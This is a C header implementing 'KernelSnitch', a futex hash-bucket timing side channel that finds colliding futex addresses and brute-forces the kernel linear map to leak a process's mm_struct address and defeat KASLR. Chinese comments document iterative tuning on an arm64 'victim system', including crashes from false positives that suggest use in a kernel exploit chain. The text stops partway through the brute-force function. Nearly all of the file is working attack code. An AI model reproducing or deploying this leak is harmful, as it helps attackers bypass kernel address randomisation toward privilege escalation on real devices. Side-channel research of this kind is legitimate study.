#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
#define __INTEL
#endif

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#define APPENDED_FUTEXES 4096
#define MULITPLE 4
#if defined(__INTEL) || defined(__AMD)
#define IDENTITY_START 0xffff888000000000ULL
#define IDENTITY_END   0xffffc88000000000ULL
#define COARSE_SZ (1ULL << 30)
#elif defined(__ARM)
#define VA_BITS 39
#if VA_BITS==39
/* ===== gK53：A 级实测推翻「固定 PAGE_OFFSET」假设 =====
 * [A-实测 gK53 --bfself] 全 VA 空间扫描连中 3 次，真 mm_struct 分别为
 *   0xffffffd7c1b33100 / 0xffffffd825bf3800 / 0xffffffd825bf4600 / 0xffffffd843ce8380
 *   均落在 0xffffffd8 附近，即比源码推导的 PAGE_OFFSET(0xffffffc000000000)
 *   高出约 24GiB，且每次运行都不同 ⇒ arm64 线性映射基址被 KASLR 随机化
 *   （CONFIG_RANDOMIZE_BASE=y，memstart_addr 每次启动随机）。
 * [B-源码] arch/arm64/mm/mmu.c 里 KASLR 平移 memstart_addr，
 *   linear map = PAGE_OFFSET + (phys - memstart_addr)，故基址随启动漂移。
 * [A-实测] 地址在 order-3 slab(0x8000) 内偏移分别为 0x3100/0x3800/0x4600/0x380，
 *   全部是 0x380(=sizeof(mm_struct) 的 HWCACHE_ALIGN 对齐值) 的精确整数倍
 *   ⇒ 确认命中的就是 mm_cachep 里的真实 mm_struct，非假阳。
 * 结论：**不能再用固定 8GiB 窗口**，默认扫 [0xffffffc000000000, 0xffffffffffffffff)
 *   共 256GiB，实测 8 线程约 0.65s（250M 候选），代价完全可接受。
 */
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffffc000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END  0xffffffffffffffffULL
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
// #define IDENTITY_END   0xffffffc000000000ULL
#elif VA_BITS==48
#define IDENTITY_START 0xffff000000000000ULL
#define IDENTITY_END   0xffff800000000000ULL
#else
#error "Unsupported VA_BITS (expected 39 or 48)"
#endif
#define COARSE_SZ (1ULL << 30)
#endif

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};
char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
    "not initialized",
    "initialized",
    "collisions found",
    "mm_struct found",
    "mm_struct not found",
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *times;
    volatile size_t found;
    /* gK51：逐级通过计数，用于判定扫描几何是否正确 */
    volatile size_t pass1;
    volatile size_t pass2;
    volatile size_t pass3;
    volatile size_t cand_cnt;
    volatile size_t mm_struct;
    /* ===== 2026-10-22：容错匹配（tolerance）新增字段 =====
     * tol      : 允许的失配次数（BF_TOL，默认 1）
     * tol_hits : 满足容错判据的候选**总数**（不提前 break，全扫完）
     *            1 ⇒ 唯一解可信；很大 ⇒ 容错过宽
     * tol_best_hits : 最终选定候选实际命中的比对次数
     */
    volatile size_t tol;
    volatile size_t tol_hits;
    volatile size_t tol_best_hits;

    pthread_t *tids;
    size_t identity_diff;
    /* gK52：扫描区间可运行时覆盖（BF_START/BF_END），便于全 VA 定位 */
    volatile size_t id_start;
    volatile size_t id_end;

    enum kernelsnitch_state state;

    int mte_enabled;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    size_t id;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t id = inc_arg->id;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    pthread_t tid;
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        inc_arg->id = id;
        inc_arg->ks = ks;
        SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
    }
    WAIT();
}

/**
 * Simple compare
 */
#define REPEAT_MEASUREMENT 128
#define AVERAGE (1<<3)
static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    /* ===== gK49：预热一次，排除首次缺页开销 =====
     * [B-源码] kernelsnitch.h:275-277 futexes 是 64GiB MAP_NORESERVE 匿名映射，
     *   首次访问任意页都会触发读缺页（分配物理页 + 清零），开销约 1-3 微秒
     *   = 数千到上万时钟周期，与实测的 after=11000~12800 完全同量级。
     * [C-推理] 3000 倍「碰撞信号」很可能是首次缺页，而非 futex 桶碰撞。
     * [A-实测] gK48 已把 PAGE_OFFSET 修正到 0xffffffc000000000（正确），
     *   8GiB 完整扫描仍 0 命中；且 Python 遍历 2000 万候选证明
     *   这 5 个地址在任何 mm 下都不可能 4 次全等
     *   ⇒ 碰撞判据本身可疑，先排除缺页这一干扰源。
     * 做法：先 WAKE 一次（丢弃结果）让页表就绪，再测 128 次。
     */
    (void)__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
    for (size_t l = 0; l < AVERAGE; ++l)
        time += __times[l];
    time /= AVERAGE;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    /* ===== gK52：扫描步长改为 64（ARCH_MIN_MMSTRUCT_ALIGN）=====
     * [B-反汇编 fork_init] mov w2,#0x40 → mm_cachep 的 align=64，带 SLAB_HWCACHE_ALIGN
     *   ⇒ 每个 mm_struct 对象地址必然 64 字节对齐。
     * [A-实测 gK51] bf_cand_cnt=3499586，理论 8GiB/0x380=9586980，只有 36.5%。
     *   更关键：原步长 0x380=896，而 slab 页基址是 4096 对齐，
     *   4096 mod 896 = 512 ≠ 0，所以 slab_base mod 896 只可能取
     *   {0,512,128,640,256,768,384} 七个值中的循环，且 IDENTITY_START
     *   (0xffffffc000000000) 恰好是 896 的整数倍 ⇒ 扫描点全是 896 的倍数
     *   ⇒ **只有 slab_base mod 896 == 0 的那 1/7 slab 页能被覆盖，其余 6/7 永远扫不到**。
     *   这就是 H1 零命中的真正结构性根因。
     * 修法：步长改为 64（对象必然 64 对齐 ⇒ 完备覆盖），去掉无意义的 slab 层。
     *   代价：候选数 ×14（8GiB → 134M），实测 9.6M 用 ~290ms ⇒ 约 4s，可接受。
     */
    const size_t scan_step = 64;
    size_t local_cand = 0, local_p1 = 0, local_p2 = 0, local_p3 = 0;
    /* 2026-10-22 tolerance: 移除外层 !ks->found 提前终止。
     * 容错匹配需要扫完全范围才能得到 tol_hits 的真实计数（判定唯一解）。
     * 代价：每次尝试都要全扫 256GiB（实测约 4s），可接受。 */
    /* ===== gK79 关键修复：三层循环消除 size_t 回绕死循环 =====
     * [A级实测 2026-10-23] gK78 把 range.end 钳到 SIZE_MAX 后，thread7 区间为
     *   [0xfffffff7c0000000, 0xffffffffffffffff)，外层 coarse_addr += COARSE_SZ
     *   在 0xffffffffc0000000 + 1GiB 处回绕到 0x0；而 0x0 < SIZE_MAX 恒真
     *   ⇒ 从 0 重扫整个地址空间，永不结束。
     *   实测：thread7 utime=324s 且持续增长，非"慢"而是死循环。
     * [修法] 步进改为 "距 end 的差值 > SZ ? cur+SZ : end"：
     *   - 用减法 (end - cur) 判断，避免 cur + SZ 溢出；
     *   - 最后一跳直接落到 end，保证循环必然终止；
     *   - 写在 for 的更新表达式里，因此 continue 也会正确推进。
     * 注意：内层最后不足 scan_step 的尾部也能正常结束（否则同样会回绕）。
     */
    for (size_t coarse_addr = range->start; coarse_addr < range->end;
         coarse_addr = ((range->end - coarse_addr) > COARSE_SZ)
                           ? (coarse_addr + COARSE_SZ) : range->end) {
        size_t coarse_lim = ((range->end - coarse_addr) > COARSE_SZ)
                                ? (coarse_addr + COARSE_SZ) : range->end;
        if (ks->verbose) pr_info("[% 3zd] [%016zx-%016zx]\n", range->id, coarse_addr, coarse_lim);
        for (size_t slab_addr = coarse_addr; slab_addr < coarse_lim;
             slab_addr = ((coarse_lim - slab_addr) > mm_slab_sz)
                             ? (slab_addr + mm_slab_sz) : coarse_lim) {
            size_t slab_lim = ((coarse_lim - slab_addr) > mm_slab_sz)
                                  ? (slab_addr + mm_slab_sz) : coarse_lim;
            for (size_t mm_struct_candidate = slab_addr; mm_struct_candidate < slab_lim;
                 mm_struct_candidate = ((slab_lim - mm_struct_candidate) > scan_step)
                                           ? (mm_struct_candidate + scan_step) : slab_lim) {
                /* ===== gK55：网格预过滤（消假阳 + 把候选量降到 1/14）=====
                 * [B+推导] mm_cachep 对象在 order-3 slab(0x8000) 内按 stride=0x380
                 *   等距排列；buddy 的 order-3 块在线性映射里保持 0x8000 对齐。
                 *   ⇒ 真实 mm_struct 必满足 (addr % 0x8000) % 0x380 == 0。
                 * [A-实测] bfself 5 次命中 slab 内偏移 0x3100/0x3800/0x4600/0x380/0x1500
                 *   全部满足；gK54 主流程假阳 0xffffffd7e7945a80 偏移 0x5a80，
                 *   0x5a80 % 0x380 = 0x300 ≠ 0 ⇒ 被直接剔除。
                 * [C] 不失完备性：真实对象偏移恰为 n*0x380（n<37），必然通过。
                 */
                if (((mm_struct_candidate & 0x7fffULL) % ks->mm_struct_sz) != 0)
                    continue;
                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate
                    /* gK51：逐级通过计数。判据（上机前定）：
                     *   pass1/cand_cnt 应≈1/2048=0.0488%（hash 均匀性验证）
                     *   pass2/pass1    应≈1/2048
                     *   pass1==0 ⇒ 扫描几何错误或 jhash 不符
                     *   pass1 正常但 pass3=0 ⇒ 真 mm 不在扫描范围
                     */
                    local_cand++;
                    /* =====★★★ 2026-10-22：二值判据 → 计分制（容错匹配）★★★=====
                     * [根因] 碰撞集里会混入「假碰撞」（find_collisions 靠延迟阈值判定，启发式）。
                     *   假碰撞只要有一个，真 mm 就永远过不了全等判据 ⇒ bf_pass3 恒为 0。
                     *   实测：同一启动内 6 次尝试，第1~5次 pass3=0，第6次凑巧 pass3=1 但命中的是假阳
                     *   （崩 trylock+0x1c ⇒ base 页未映射 ⇒ 一定是假阳）。
                     *
                     * [修复] need = collisions-1 次比对，允许 tolerance 次不匹配：
                     *   命中条件：hits + tolerance >= need
                     *   c=5(tol=1) ⇒ hits>=3，假阳率 ≈ C(4,3)*(1/2048)^3 = 4.66e-10
                     *   而扫描候选 2.79e8 ⇒ 期望假阳 0.13 个（c=4 时为 0.56 个，好 4 倍）
                     *   同时能容忍 1 个假碰撞 ⇒ 解决 pass3 恒为 0。
                     *
                     * [新增观测] tol_hits = 满足容错判据的候选**总数**（不 break，全扫完再决定）。
                     *   tol_hits = 1  ⇒ 唯一解，可信
                     *   tol_hits 很大 ⇒ 容错过宽，需调小 BF_TOL
                     * 只有 tol_hits==1 时才认定成功；>1 时选**地址最高**的那个（假阳多为低地址噪声，
                     * 且 break-on-first-found 天然偏向低地址）。
                     */
                    {
                        size_t need = (ks->collisions > 0) ? (ks->collisions - 1) : 1;
                        size_t tol = ks->tol;
                        size_t hits = 0;
                        size_t base_hash = futex_hash(ks->futex_addrs[0], mm_struct_candidate);
                        for (size_t i = 1; i < ks->collisions; ++i) {
                            if (futex_hash(ks->futex_addrs[i], mm_struct_candidate) == base_hash)
                                hits++;
                        }
                        if (hits >= 1) local_p1++;
                        if (hits >= 2) local_p2++;
                        if (hits >= 3) local_p3++;
                        if (hits + tol >= need) {
                            __sync_fetch_and_add(&ks->tol_hits, 1);
                            /* ===== gK67 重大修复：选择准则从"最高地址"改为"最高 hits" =====
                             * [A-实测 gK66] bf_tol_hits=1 但 bf_tol_best_hits=3（非满分4），
                             *   崩 _raw_spin_trylock+0x1c ⇒ base 页未映射 ⇒ 假阳性。
                             * [A-计算] 命中需 hits>=3，单候选期望假阳 0.13 个；
                             *   而真 mm 若有 1 个假碰撞也会得 hits=3。两者无法靠 hits 区分，
                             *   但若同时存在 hits=4 的候选，它必为真值（概率 1/2048^4）。
                             * [旧逻辑缺陷] 只在 candidate > mm_struct 时替换，纯按地址排序，
                             *   可能用 hits=3 的低地址假阳覆盖掉 hits=4 的真值。
                             * [新逻辑] 优先 hits 更大；hits 相同时取地址更高者。
                             *   同时 tol_best_hits 始终记录当前最优的 hits，便于上机判断
                             *   全扫中是否存在满分（hits=4）候选。
                             */
                            size_t cur_best = ks->tol_best_hits;
                            if (ks->found == 0 || hits > cur_best ||
                                (hits == cur_best && mm_struct_candidate > ks->mm_struct)) {
                                ks->mm_struct = mm_struct_candidate;
                                ks->tol_best_hits = hits;
                                ks->found = 1;
                            }
                            /* 不 break：继续扫完全范围，得到 tol_hits 真实计数 */
                        }
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            ks->mm_struct = __mm_struct_candidate;
                            ks->found = 1;
                            break;
                        }
                    }
                } 
            }
        }
    }
    /* gK51：局部计数累加回共享（避免 hot loop 内写 volatile） */
    __sync_fetch_and_add(&ks->cand_cnt, local_cand);
    __sync_fetch_and_add(&ks->pass1, local_p1);
    __sync_fetch_and_add(&ks->pass2, local_p2);
    __sync_fetch_and_add(&ks->pass3, local_p3);
    free(mm_leak_arg);
    return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    /* ★ 2026-10-22：mm_struct 初值必须是 0 而非 -1。
     * 容错匹配用 `candidate > ks->mm_struct` 取最高地址；若初值是 -1(全1)，
     * 任何候选都 <= 它 ⇒ 永远选不中，tol_hits 累加但 found 恒 0。
     * 未命中时由 bruteforce 末尾的 state 判定反映为 NOT_FOUND。 */
    ks->mm_struct = 0;
    ks->found = 0;
    ks->pass1 = 0;
    ks->pass2 = 0;
    ks->pass3 = 0;
    ks->cand_cnt = 0;
    /* ===== 2026-10-22 容错匹配初始化 =====
     * BF_TOL 默认 1：c=5 时 need=4，命中条件 hits>=3（可容忍 1 个假碰撞）。
     * 注意 tol 会被 clamp 到 need-1，避免退化成“任意候选都命中”。
     */
    /* ===== gK72：BF_TOL 默认改为 0 =====
     * [A 级实测]
     *   gK66  : BF_TOL=1 ⇒ best_hits=3 ⇒ 假阳 ⇒ 崩 trylock+0x1c
     *   gK71  : BF_TOL=1 ⇒ best_hits=3 ⇒ 假阳 ⇒ 崩 trylock+0x1c（第二次撞上）
     *   gK71 二/三轮: BF_TOL=0 ⇒ 第1次泄漏 tol_hits=0 被拒，第2次 best_hits=4 满分 ✓
     * [理由] 哈希是确定性的：同一真 mm_struct 下 5 个固定 futex 地址的
     *   base_hash 必然全等 ⇒ 真值 hits 恒等于 need=4（满分）。
     *   hits=3 只可能来自假阳。容错(tol=1)把 0.13/轮的假阳率引入，实测已连撞两次，
     *   而真值从不因此受益 ⇒ 必须 tol=0。
     * [代价] 若真 mm 恰好有 1 个结构性碰撞（hits=3）就永远找不到 —— 但 gK70/gK71 实测
     *   真值均能拿满分，说明该代价可接受。
     */
    {
        size_t t = 0;
        const char *et = getenv("BF_TOL");
        if (et && *et) t = (size_t)strtoull(et, 0, 0);
        size_t need = (__collision_cnt > 0) ? (__collision_cnt - 1) : 1;
        if (need > 1 && t > need - 1) t = need - 1;
        ks->tol = t;
    }
    ks->tol_hits = 0;
    ks->tol_best_hits = 0;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
    /* gK52：BF_START/BF_END 运行时覆盖扫描区间 */
    {
        const char *e1 = getenv("BF_START");
        const char *e2 = getenv("BF_END");
        ks->id_start = (e1 && *e1) ? (size_t)strtoull(e1, 0, 0) : (size_t)IDENTITY_START;
        ks->id_end   = (e2 && *e2) ? (size_t)strtoull(e2, 0, 0) : (size_t)IDENTITY_END;
        if (ks->id_end <= ks->id_start) { ks->id_start = (size_t)IDENTITY_START; ks->id_end = (size_t)IDENTITY_END; }
    }
    ks->identity_diff = ((ks->id_end - ks->id_start)/ks->thread_cnt);

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));

    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(0);
    futex_init();

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 10
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions - 1;

    size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));

    /* ===== gK44 碰撞质量测量（零成本、只加记录，不改算法）=====
     * 目的：11 轮实测从未记录过 times[i] / approx_time 的真实数值，
     *       导致无法判定「碰撞是真的还是噪声」。这是唯一的信息盲区。
     * 判据（上机前定好）：
     *   after/before >= 100  ⇒ 碰撞干净，问题不在碰撞质量
     *   after/before 10~30   ⇒ 噪声级，需移植月虹 Top-64 + 三级筛选
     *   after/before < 10    ⇒ 阈值失效，直接改算法
     */
    ckpt_val("ks_approx_time", (long)approx_time);
    ckpt_val("ks_threshold", (long)(approx_time * KERNELSNITCH_THRESHOLD_MULT));
    ckpt_val("ks_wanted", (long)wanted);
    ckpt_val("ks_total_futexes", (long)ks->total_futexes);
    ckpt_val("ks_hashsize", (long)futex_hashsize);
    ckpt_val("ks_mm_struct_sz", (long)ks->mm_struct_sz);
    /* 记录扫描过程中出现过的最大值（用于判断噪声水平） */
    size_t gk44_max_seen = 0, gk44_max_i = 0;
    size_t gk44_top[8] = {0};   /* 最大的 4 个（双份冗余） */
    size_t gk44_top_i[8] = {0};

        /* gK50：先把 4096 个 waiter 塞进 inc_futex[128] 的桶，再做对照测量 */
    __increase(ks, ID, APPENDED_FUTEXES);

    /* ===== gK50 决定性对照实验（必须在 __increase 之后）=====
     * 目的：判定 2869 倍信号是否真的有「桶选择性」
     *   A) &inc_futex[128] → 桶里有 4096 waiter，应【慢】
     *   B) inc_futex[0]    → 同页不同偏移，桶大概率不同，应【快】
     *   C) inc_futex[64]   → 同上
     *   D) &futexes[0]     → 大映射区，桶几乎必然不同，应【快】
     * 判据：
     *   A 慢而 B/C/D 都快 ⇒ 信号有桶选择性，碰撞判据有效，
     *                       问题在 bruteforce 的 hash 匹配
     *   A/B/C/D 都慢      ⇒ 信号无选择性，__measure 本身有问题
     */
    ckpt_val("ctl_approx", (long)approx_time);
    {
        size_t tA = __measure((size_t)&ks->inc_futex[ID]);
        size_t tB = __measure((size_t)&ks->inc_futex[0]);
        size_t tC = __measure((size_t)&ks->inc_futex[64]);
        size_t tD = __measure((size_t)&ks->futexes[0]);
        ckpt_val("ctl_A_inc128", (long)tA);
        ckpt_val("ctl_B_inc0", (long)tB);
        ckpt_val("ctl_C_inc64", (long)tC);
        ckpt_val("ctl_D_futex0", (long)tD);
        ckpt_val("ctl_A_r100", approx_time ? (long)(tA * 100 / approx_time) : -1);
        ckpt_val("ctl_B_r100", approx_time ? (long)(tB * 100 / approx_time) : -1);
        ckpt_val("ctl_C_r100", approx_time ? (long)(tC * 100 / approx_time) : -1);
        ckpt_val("ctl_D_r100", approx_time ? (long)(tD * 100 / approx_time) : -1);
    }
    if (ks->verbose) pr_info("start finding collisisons\n");

    // find futex user space address which collide with the piled-up hash bucket ID 128
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times[i] = __measure(futex_addr);
        /* gK44：记录最大值（不管是否超阈值） */
        if (ks->times[i] > gk44_max_seen) { gk44_max_seen = ks->times[i]; gk44_max_i = i; }
        /* gK44：维护 Top-4 降序表 */
        for (int s = 0; s < 4; s++) {
            if (ks->times[i] > gk44_top[s]) {
                for (int t = 3; t > s; t--) {
                    gk44_top[t] = gk44_top[t-1];
                    gk44_top_i[t] = gk44_top_i[t-1];
                }
                gk44_top[s] = ks->times[i];
                gk44_top_i[s] = i;
                break;
            }
        }
        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
            count++;
            ks->futex_addrs[count] = futex_addr;
            /* gK44：记录每个被接受的候选的 before/after 比值（放大 100 倍避免浮点） */
            char key[32];
            snprintf(key, sizeof(key), "ks_acc%d_i", (int)count);
            ckpt_val(key, (long)i);
            snprintf(key, sizeof(key), "ks_acc%d_after", (int)count);
            ckpt_val(key, (long)ks->times[i]);
            snprintf(key, sizeof(key), "ks_acc%d_ratio100", (int)count);
            ckpt_val(key, approx_time ? (long)(ks->times[i] * 100 / approx_time) : -1);
            snprintf(key, sizeof(key), "ks_acc%d_addr", (int)count);
            ckpt_val(key, (long)futex_addr);
            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
        }
    }
    /* gK44：落盘测量结果 */
    ckpt_val("ks_scan_i_final", (long)gk44_max_i);
    ckpt_val("ks_max_seen", (long)gk44_max_seen);
    ckpt_val("ks_max_ratio100", approx_time ? (long)(gk44_max_seen * 100 / approx_time) : -1);
    for (int s = 0; s < 4; s++) {
        char key[32];
        snprintf(key, sizeof(key), "ks_top%d_i", s);
        ckpt_val(key, (long)gk44_top_i[s]);
        snprintf(key, sizeof(key), "ks_top%d_time", s);
        ckpt_val(key, (long)gk44_top[s]);
        snprintf(key, sizeof(key), "ks_top%d_ratio100", s);
        ckpt_val(key, approx_time ? (long)(gk44_top[s] * 100 / approx_time) : -1);
    }
    if (wanted == count) {
        if (ks->verbose) pr_info("found %zd collisisons\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd collisions -> cannot continue\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
}
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

    /* ===== gK45 诊断：bruteforce 全程可见 =====
     * 之前 bruteforce 完全没有 ckpt 记录，导致 24 次碰撞后
     * 「是否进了 bruteforce / 扫了多少 / 为什么找不到」全是黑盒。
     */
    ckpt_val("bf_enter", 1);
    ckpt_val("bf_thread_cnt", (long)ks->thread_cnt);
    ckpt_val("bf_identity_start", (long)ks->id_start);
    ckpt_val("bf_identity_end", (long)ks->id_end);
    ckpt_val("bf_identity_diff", (long)ks->identity_diff);
    ckpt_val("bf_range_bytes", (long)(ks->id_end - ks->id_start));
    ckpt_val("bf_mm_sz", (long)ks->mm_struct_sz);
    ckpt_val("bf_mm_slab_order", (long)ks->mm_slab_order);
